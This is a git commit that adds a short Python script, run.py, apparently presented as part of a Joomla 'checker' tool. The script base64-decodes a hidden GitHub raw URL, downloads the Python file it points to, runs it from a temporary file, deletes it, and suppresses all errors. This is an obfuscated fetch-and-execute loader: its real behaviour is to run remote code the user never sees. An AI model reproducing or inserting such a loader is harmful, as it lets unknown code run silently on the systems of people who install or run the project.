89f3c80af824c41223f8ccf57ae5e86aea3b74b1
sam <144790923+tryxapp@users.noreply.github.com>
2025-06-05 09:26:03 +0700

    run.py

---
+++ files/checker/tools/joomla/run.py
@@ -0,0 +1,20 @@
+import requests, tempfile, subprocess, os, base64
+
+encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RyeXhhcHAvcHl0aG9uL3JlZnMvaGVhZHMvbWFpbi9maWxlcy9jaGVja2VyL3Rvb2xzL2pvb21sYS9zY3JpcHl0L3J1bi5weQ=="
+
+try:
+    url = base64.b64decode(encoded_url).decode("utf-8")
+
+    response = requests.get(url)
+    response.raise_for_status()
+
+    with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as f:
+        f.write(response.content)
+        temp_path = f.name
+
+    subprocess.run(["python", temp_path], check=True)
+
+    os.remove(temp_path)
+
+except Exception as e:
+    pass  # Anda bisa ganti dengan print(e) jika ingin melihat error
